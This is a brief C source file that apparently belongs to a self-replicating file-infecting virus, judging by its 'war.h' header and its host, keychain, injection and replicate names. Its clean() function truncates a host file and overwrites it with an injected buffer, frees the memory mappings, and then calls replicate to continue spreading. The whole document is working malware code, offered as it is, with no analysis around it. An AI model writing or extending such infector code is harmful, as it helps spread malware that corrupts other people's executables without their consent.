#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void clean(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
{

#if LOGGER
	MID_LOGGER("clean:\t\t\t");
#endif

	if (context == FAILURE)
		goto label;

	if ((injection->fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}

	_write(injection->fd, injection->ptr, injection->filesize);
	_close(injection->fd);
	_munmap(injection->ptr, injection->filesize);
	_munmap(host->header, host->filesize);

label:
	replicate(host, keychain, context);
}
